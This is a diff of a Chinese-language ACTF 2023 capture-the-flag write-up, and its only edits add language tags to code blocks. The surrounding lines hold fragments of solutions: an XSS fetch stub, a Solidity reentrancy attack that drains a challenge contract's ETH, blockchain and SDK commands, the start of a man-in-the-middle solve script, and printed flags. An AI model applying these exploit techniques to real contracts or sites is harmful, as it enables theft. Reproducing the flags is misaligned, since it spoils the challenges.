@@ -102,7 +102,7 @@ preview路由存在xss
 bot的cookie里面有flag，但是存在httponly,无法盗取cookie
 ![](7.png)
 
-```
+```javascript
 通过fetch post请求 login 和 vip，获取flag
 const loginUrl = '/login';
 const vipUrl = '/vip';
@@ -334,7 +334,7 @@ def getsession():
 0. **我们的目标是****清空题目合约中的ETH余额**，初始状态下余额为**3 ETH**
 1. **构造**​`receive`​函数，在触发重入效果时执行`deposit`​ `coins[1]`​操作：
 
-    ```
+    ```solidity
     receive() external payable {
             if (msg.value == 1) {
                 uint256 amount = token.balanceOf(address(this));
@@ -344,7 +344,7 @@ def getsession():
     ```
 2. **调用**​`preSwap`​函数，使用`msg.value=1 ether(ETH is coins[0])`​兑换得到`coins[1]`​的`balances`​，同时提前`approve`​以便后续`transferFrom`​成功：
 
-    ```
+    ```solidity
     function preSwap() external payable {
             target.swap{value: msg.value}(0, 1, msg.value);
             token.approve(address(target), type(uint256).max);
@@ -352,7 +352,7 @@ def getsession():
     ```
 3. **调用**​`hack`​函数，循环执行`4`​次，每次`withdraw`​所拥有的全部`coins[1]`​，并且将其`swap`​为`ETH(coins[0])`​，同时附带`msg.value=1 wei`​以便重入到`receive`​函数时进行识别，在执行`4`​次循环后我们就有足够的`balances[0]`​来`withdraw`​题目合约上所有的**4 ETH(3+1=4)**：
 
-    ```
+    ```solidity
     function hack() external payable {
             uint256 amount = target.balances(1, address(this));
             for (uint i = 0; i < 4; i++) {
@@ -368,7 +368,7 @@ def getsession():
 
 ![image](ACTF2023-6.png)​
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -414,7 +414,7 @@ contract Farmer {
 }
 ```
 
-```
+```python
 from Poseidon.Blockchain import *
 
 chain = Chain("http://120.46.58.72:8545")
@@ -437,7 +437,7 @@ contract.ReadOnlyCallFunction("isSolved")
 
 **得到****flag**为：
 
-```
+```text
 ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
 ```
 
@@ -457,7 +457,7 @@ ACTF{8EW@rE_0F_vEnom0us_sNaK3_81T3$_as_1t_HA$_nO_cOnSc1ENCe}
 
 **下载并构建交互工具（提前安装好 **`java 8`​ 或以上版本）：
 
-```
+```bash
 git clone https://github.com/FISCO-BCOS/java-sdk-demo.git
 cd java-sdk-demo
 git checkout origin/main-2.0
@@ -474,7 +474,7 @@ git checkout origin/main-2.0
 
 **最后分别执行下面两条命令，订阅并获取**​`公共频道(flag1)`​和`私有频道(flag2)`​的消息：
 
-```
+```bash
 java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriber 'flag1'
 
 java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPrivateByKey subscribe 'flag2' conf/amop/privkey
@@ -486,7 +486,7 @@ java -cp 'conf/:lib/*:apps/*' org.fisco.bcos.sdk.demo.amop.tool.AmopSubscriberPr
 
 **拼接后得到****完整flag**为：
 
-```
+```text
 ACTF{Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG}
 ```
 
@@ -514,7 +514,7 @@ ACTF{Con5oR7ium_B1ock_cHAiN_sO_INterESt1NG}
 
 **以下是出题人赛后提供的**​`solve`​脚本，本质上是基于文档中`私有话题的认证流程`​部分内容从`网络通信层`​进行`中间人攻击`​，留作参考：
 
-```
+```python
 from pwn import *
 import abc
 import socket
